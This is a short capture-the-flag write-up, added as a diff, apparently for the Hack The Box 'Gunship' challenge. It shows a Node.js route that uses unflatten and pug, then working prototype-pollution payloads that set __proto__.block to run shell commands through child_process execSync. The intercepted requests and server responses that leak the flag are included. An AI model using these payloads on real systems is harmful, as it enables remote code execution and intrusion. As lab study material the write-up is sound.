@@ -1,0 +1,58 @@
+let's code review:
+router.post('/api/submit', (req, res) => {
+    const { artist } = unflatten(req.body);
+
+	if (artist.name.includes('Haigh') || artist.name.includes('Westaway') || artist.name.includes('Gingell')) {
+		return res.json({
+			'response': pug.compile('span Hello #{user}, thank you for letting us know!')({ user: 'guest' })
+		});
+	} else {
+		return res.json({
+			'response': 'Please provide us with the full name of an existing member.'
+		});
+	}
+});
+
+pug 3.0.0 RCE, reference:
+https://github.com/pugjs/pug/issues/3312
+
+please fill input and intercept using burpsuite:
+POST /api/submit HTTP/1.1
+Host: 142.93.47.151:30095
+Content-Length: 26
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
+Content-Type: application/json
+Accept: */*
+Origin: http://142.93.47.151:30095
+Referer: http://142.93.47.151:30095/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+{"artist.name":"Westaway"}
+
+change payload http request to this:
+{
+	"artist.name":"Haigh","__proto__.block": {
+	"type": "Text", 
+	"line": "process.mainModule.require('child_process').execSync('$(ls | grep flag)')"
+	}
+}
+response:
+<pre>Error: Command failed: $(ls | grep flag)<br>/bin/sh: flag1osSz: not found<br> on line 1<br>
+
+adjusting execSync to this: cat flag1osSz
+change payload to this:
+{
+  "artist.name": "Haigh",
+  "__proto__.block": {
+    "type": "Text",
+    "line": "process.mainModule.require('child_process').execSync('$(cat flag1osSz)')"
+  }
+}
+response:
+<body>
+<pre>Error: Command failed: $(cat flag1osSz)<br>/bin/sh: HTB{wh3n_lif3_g1v3s_y0u_p6_st4rT_p0llut1ng_w1th_styl3!!}: not found<br> on line 1<br>
+
+resource:
+https://harshitm98.github.io/posts/htb-challenge-gunship/
